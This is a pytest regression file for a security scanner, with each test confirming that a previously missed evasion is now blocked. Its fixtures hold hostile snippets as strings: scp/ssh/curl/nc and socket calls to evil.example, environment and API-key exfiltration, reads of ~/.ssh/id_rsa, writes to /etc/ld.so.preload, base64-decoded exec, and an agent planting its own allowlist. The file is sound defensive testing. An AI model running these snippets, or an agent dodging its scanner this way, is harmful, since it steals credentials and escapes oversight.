"""Regression tests for the adversarial-review bypasses (F1..F7) in
scripts/security_scan.py.

Each formerly-bypassing snippet must now verdict BLOCKED.  Also covers the
allowlist hardening (a planted ``security_allowlist.txt`` next to the scanned
script is ignored; an explicit ``--allow`` still clears SEC-003 but never
SEC-001/SEC-002) and the existing self-test expectations.

The scanner has no package structure, so it is loaded via importlib from its
file path (same pattern as tests/test_validate_verdicts.py).  Stdlib + pytest
only; the scanner is exercised in-process through ``scan_file``/``main`` and
all fixtures use ``tmp_path``.
"""

from __future__ import annotations

import importlib.util
import io
from contextlib import redirect_stdout
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
SCANNER_PATH = REPO_ROOT / "scripts" / "security_scan.py"

_spec = importlib.util.spec_from_file_location(
    "security_scan_under_test", SCANNER_PATH)
secscan = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(secscan)


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def write_script(tmp_path: Path, source: str, name: str = "snippet.py") -> Path:
    p = tmp_path / name
    p.write_text(source, encoding="utf-8")
    return p


def write_allow(tmp_path: Path, lines, name: str = "security_allowlist.txt") -> Path:
    p = tmp_path / name
    p.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return p


def rule_ids(rep: dict) -> set:
    return {f["rule_id"] for f in rep["findings"]}


def scan(tmp_path: Path, source: str, allow: Path | None = None,
         name: str = "snippet.py") -> dict:
    """Scan a source string through the scanner's scan entry point."""
    return secscan.scan_file(write_script(tmp_path, source, name), allow)


# ---------------------------------------------------------------------------
# F1 — list-form subprocess egress (scp/ssh/curl/wget/nc)
# ---------------------------------------------------------------------------

F1_SNIPPETS = {
    "scp": (
        "import subprocess\n"
        "subprocess.run([\"scp\", \"results.tar.gz\","
        " \"attacker.evil.example:/incoming/\"])\n"
    ),
    "ssh": (
        "import subprocess\n"
        "subprocess.run([\"ssh\", \"bot.evil.example\", \"whoami\"])\n"
    ),
    "ssh_user_at": (
        "import subprocess\n"
        "subprocess.run([\"ssh\", \"root@bot.evil.example\", \"whoami\"])\n"
    ),
    "curl": (
        "import subprocess\n"
        "subprocess.run([\"curl\", \"http://evil.example/payload\"])\n"
    ),
    "wget": (
        "import subprocess\n"
        "subprocess.run([\"wget\", \"http://evil.example/payload\"])\n"
    ),
    "nc": (
        "import subprocess\n"
        "subprocess.run([\"nc\", \"evil.example\", \"4444\"])\n"
    ),
}


@pytest.mark.parametrize("tool", sorted(F1_SNIPPETS))
def test_f1_subprocess_list_egress_blocked(tmp_path, tool):
    rep = scan(tmp_path, F1_SNIPPETS[tool])
    assert rep["verdict"] == secscan.BLOCKED
    ids = rule_ids(rep)
    assert "SEC-003" in ids
    assert "SEC-107" in ids


def test_f1_subprocess_list_egress_cli_exit_3(tmp_path):
    script = write_script(tmp_path, F1_SNIPPETS["scp"])
    buf = io.StringIO()
    with redirect_stdout(buf):
        rc = secscan.main([str(script)])
    assert rc == secscan.EXIT_BLOCKED


def test_f1_benign_list_subprocess_still_passes(tmp_path):
    rep = scan(tmp_path,
               "import subprocess\n"
               "subprocess.run([\"python\", \"train.py\", \"--epochs\", \"1\"],"
               " check=True)\n")
    assert rep["verdict"] == secscan.PASS
    assert not rule_ids(rep)


# ---------------------------------------------------------------------------
# F2 — inline socket.socket().connect()
# ---------------------------------------------------------------------------

def test_f2_inline_socket_connect_blocked(tmp_path):
    rep = scan(tmp_path,
               "import socket\n"
               "socket.socket().connect((\"evil.example\", 4444))\n")
    assert rep["verdict"] == secscan.BLOCKED
    ids = rule_ids(rep)
    assert "SEC-003" in ids
    assert "SEC-107" in ids


def test_f2_inline_socket_connect_aliased_module(tmp_path):
    rep = scan(tmp_path,
               "import socket as sk\n"
               "sk.socket().connect((\"evil.example\", 4444))\n")
    assert rep["verdict"] == secscan.BLOCKED
    assert "SEC-003" in rule_ids(rep)


# ---------------------------------------------------------------------------
# F3 — inline env exfiltration is SEC-002 even under a host allowlist
# ---------------------------------------------------------------------------

F3_REQUESTS = (
    "import os\n"
    "import requests\n"
    "requests.post(\"http://mirror.example/upload\", data=dict(os.environ))\n"
)

F3_SUBPROC = (
    "import os\n"
    "import subprocess\n"
    "secret = os.environ[\"API_KEY\"]\n"
    "subprocess.run([\"curl\", \"-d\", secret,"
    " \"http://mirror.example/upload\"])\n"
)


def test_f3_requests_env_exfil_blocked_under_allowlist(tmp_path):
    allow = write_allow(tmp_path, ["host:mirror.example"])
    rep = scan(tmp_path, F3_REQUESTS, allow=allow)
    assert rep["verdict"] == secscan.BLOCKED
    ids = rule_ids(rep)
    assert "SEC-002" in ids           # exfil is never exonerated
    assert "SEC-003" not in ids       # host itself is allowlisted


def test_f3_subprocess_env_exfil_blocked_under_allowlist(tmp_path):
    allow = write_allow(tmp_path, ["host:mirror.example"])
    rep = scan(tmp_path, F3_SUBPROC, allow=allow)
    assert rep["verdict"] == secscan.BLOCKED
    ids = rule_ids(rep)
    assert "SEC-002" in ids
    assert "SEC-003" not in ids


def test_f3_env_exfil_cli_exit_3_with_allow(tmp_path):
    script = write_script(tmp_path, F3_REQUESTS)
    allow = write_allow(tmp_path, ["host:mirror.example"])
    buf = io.StringIO()
    with redirect_stdout(buf):
        rc = secscan.main([str(script), "--allow", str(allow)])
    assert rc == secscan.EXIT_BLOCKED


# ---------------------------------------------------------------------------
# F4 — credential paths assembled from parts
# ---------------------------------------------------------------------------

def test_f4_expanduser_split_credential_blocked(tmp_path):
    rep = scan(tmp_path,
               "import os\n"
               "open(os.path.expanduser(\"~/.s\" + \"sh/id_\" + \"rsa\")).read()\n")
    assert rep["verdict"] == secscan.BLOCKED
    assert "SEC-001" in rule_ids(rep)


def test_f4_path_home_div_chain_credential_blocked(tmp_path):
    rep = scan(tmp_path,
               "from pathlib import Path\n"
               "(Path.home() / (\".s\" + \"sh\") / (\"id_\" + \"rsa\")).read_text()\n")
    assert rep["verdict"] == secscan.BLOCKED
    assert "SEC-001" in rule_ids(rep)


def test_f4_os_path_join_credential_blocked(tmp_path):
    rep = scan(tmp_path,
               "import os\n"
               "open(os.path.join(os.path.expanduser(\"~\"), \".ssh\","
               " \"id_rsa\")).read()\n")
    assert rep["verdict"] == secscan.BLOCKED
    assert "SEC-001" in rule_ids(rep)


def test_f4_benign_path_join_not_flagged(tmp_path):
    rep = scan(tmp_path,
               "from pathlib import Path\n"
               "root = Path(\"data\")\n"
               "cfg = root / \"train\" / \"config.json\"\n"
               "open(\"results/summary.txt\", \"w\").write(\"ok\")\n")
    assert rep["verdict"] == secscan.PASS
    assert not rule_ids(rep)


# ---------------------------------------------------------------------------
# F5 — /etc write vectors (os.open, shutil copy/move, tracked Path)
# ---------------------------------------------------------------------------

def test_f5_os_open_etc_write_blocked(tmp_path):
    rep = scan(tmp_path,
               "import os\n"
               "fd = os.open(\"/etc/ld.so.preload\", os.O_WRONLY | os.O_CREAT)\n"
               "os.write(fd, b\"evil.so\\n\")\n")
    assert rep["verdict"] == secscan.BLOCKED
    assert "SEC-008" in rule_ids(rep)


@pytest.mark.parametrize("func", ["copy", "copy2", "copyfile", "copytree", "move"])
def test_f5_shutil_etc_blocked(tmp_path, func):
    rep = scan(tmp_path,
               "import shutil\n"
               f"shutil.{func}(\"payload.so\", \"/etc/ld.so.preload\")\n")
    assert rep["verdict"] == secscan.BLOCKED
    assert "SEC-008" in rule_ids(rep)


def test_f5_tracked_path_write_text_etc_blocked(tmp_path):
    rep = scan(tmp_path,
               "from pathlib import Path\n"
               "p = Path(\"/etc\") / \"profile.d\" / \"x\"\n"
               "p.write_text(\"evil\")\n")
    assert rep["verdict"] == secscan.BLOCKED
    assert "SEC-008" in rule_ids(rep)


@pytest.mark.parametrize("call", [
    "p.write_bytes(b\"evil\")",
    "p.open(\"w\").write(\"evil\")",
    "p.unlink()",
    "p.rename(\"/etc/profile.d/y\")",
])
def test_f5_tracked_path_other_writes_etc_blocked(tmp_path, call):
    rep = scan(tmp_path,
               "from pathlib import Path\n"
               "p = Path(\"/etc\") / \"profile.d\" / \"x\"\n"
               f"{call}\n")
    assert rep["verdict"] == secscan.BLOCKED
    assert "SEC-008" in rule_ids(rep)


def test_f5_benign_shutil_not_flagged(tmp_path):
    rep = scan(tmp_path,
               "import shutil\n"
               "shutil.copy(\"a.txt\", \"out/b.txt\")\n")
    assert rep["verdict"] == secscan.PASS
    assert not rule_ids(rep)


# ---------------------------------------------------------------------------
# F6 — codecs.decode(x, "base64") recognized as base64-decode
# ---------------------------------------------------------------------------

def test_f6_codecs_decode_base64_exec_blocked(tmp_path):
    rep = scan(tmp_path,
               "import codecs\n"
               "blob = codecs.decode(\"cHJpbnQoJ2hlbGxvJyk=\", \"base64\")\n"
               "exec(blob)\n")
    assert rep["verdict"] == secscan.BLOCKED
    assert "SEC-007" in rule_ids(rep)


def test_f6_codecs_decode_base_64_variant_blocked(tmp_path):
    rep = scan(tmp_path,
               "import codecs\n"
               "blob = codecs.decode(\"cHJpbnQoJ2hlbGxvJyk=\", \"base_64\")\n"
               "exec(blob)\n")
    assert rep["verdict"] == secscan.BLOCKED
    assert "SEC-007" in rule_ids(rep)


def test_f6_codecs_decode_non_base64_not_flagged(tmp_path):
    rep = scan(tmp_path,
               "import codecs\n"
               "text = codecs.decode(b\"hello\", \"rot_13\")\n"
               "print(text)\n")
    assert "SEC-007" not in rule_ids(rep)


# ---------------------------------------------------------------------------
# F7 — allowlist hardening: no auto-load; --allow still clears SEC-003 only
# ---------------------------------------------------------------------------

EGRESS_SNIPPET = (
    "import requests\n"
    "requests.get(\"http://evil.example/payload\")\n"
)


def test_f7_planted_allowlist_is_ignored(tmp_path):
    # agent plants its own exemption next to the scanned script
    write_allow(tmp_path, ["host:evil.example"])
    rep = scan(tmp_path, EGRESS_SNIPPET)
    assert rep["allowlist_file"] is None
    assert rep["verdict"] == secscan.BLOCKED
    assert "SEC-003" in rule_ids(rep)


def test_f7_planted_allowlist_cli_exit_3(tmp_path):
    write_allow(tmp_path, ["host:evil.example"])
    script = write_script(tmp_path, EGRESS_SNIPPET)
    buf = io.StringIO()
    with redirect_stdout(buf):
        rc = secscan.main([str(script)])
    assert rc == secscan.EXIT_BLOCKED


def test_f7_explicit_allow_clears_sec003_but_records_107(tmp_path):
    allow = write_allow(tmp_path, ["host:evil.example"])
    rep = scan(tmp_path, EGRESS_SNIPPET, allow=allow)
    ids = rule_ids(rep)
    assert rep["verdict"] == secscan.WARN
    assert "SEC-003" not in ids
    assert "SEC-107" in ids


def test_f7_explicit_allow_cli_exit_0(tmp_path):
    allow = write_allow(tmp_path, ["host:evil.example"])
    script = write_script(tmp_path, EGRESS_SNIPPET)
    buf = io.StringIO()
    with redirect_stdout(buf):
        rc = secscan.main([str(script), "--allow", str(allow)])
    assert rc == secscan.EXIT_OK


def test_f7_allowlist_never_exonerates_credential_access(tmp_path):
    allow = write_allow(tmp_path, ["host:evil.example"])
    rep = scan(tmp_path,
               "import os\n"
               "import requests\n"
               "key = open(os.path.expanduser(\"~/.ssh/id_rsa\")).read()\n"
               "requests.post(\"http://evil.example/collect\", data=key)\n",
               allow=allow)
    assert rep["verdict"] == secscan.BLOCKED
    assert "SEC-001" in rule_ids(rep)


# ---------------------------------------------------------------------------
# self-test regressions (the original 16 expectations must stay green,
# plus the new F1..F7 cases)
# ---------------------------------------------------------------------------

def _evaluate_case(case, tmp_path) -> dict:
    _name, fname, source, allow, _wv, _wp, _wa = case[:7]
    pass_allow = case[7] if len(case) > 7 else True
    script = tmp_path / fname
    script.write_text(source, encoding="utf-8")
    allow_path = None
    if allow:
        af = tmp_path / "security_allowlist.txt"
        af.write_text("\n".join(allow), encoding="utf-8")
        if pass_allow:
            allow_path = af
    return secscan.scan_file(script, allow=allow_path)


@pytest.mark.parametrize(
    "case", secscan.SELF_TEST_CASES,
    ids=[c[0] for c in secscan.SELF_TEST_CASES])
def test_self_test_expectation(case, tmp_path):
    _name, _fname, _source, _allow, want_verdict, want_present, want_absent = case[:7]
    rep = _evaluate_case(case, tmp_path)
    ids = rule_ids(rep)
    assert rep["verdict"] == want_verdict
    assert set(want_present) <= ids
    assert not (set(want_absent) & ids)


def test_full_self_test_is_green():
    buf = io.StringIO()
    with redirect_stdout(buf):
        rc = secscan.run_self_test()
    assert rc == secscan.EXIT_OK


def test_original_sixteen_expectations_present():
    """The pre-bypass-fix catalogue had 16 cases; the current list must
    still contain all of them (new cases are appended, never replacing)."""
    assert len(secscan.SELF_TEST_CASES) >= 16
    names = [c[0] for c in secscan.SELF_TEST_CASES]
    for expected in (
        "benign training script",
        "credential theft + env exfiltration",
        "shell=True + pip install",
        "malicious + host allowlist (credential access NOT exonerated)",
        "fork bomb (shell)",
        "destructive ops (shell)",
        "exec of base64-decoded payload",
        "eval of downloaded content",
        "torch.load without weights_only",
        "torch.load with weights_only=True (safe)",
        "curl to non-allowlisted host (shell)",
        "curl to allowlisted host (shell) -> recorded WARN only",
        "sudo + /etc write + crontab (shell)",
        "docker run --privileged (shell)",
        "os.system + pickle.load",
        "socket.connect to raw host (python)",
    ):
        assert expected in names
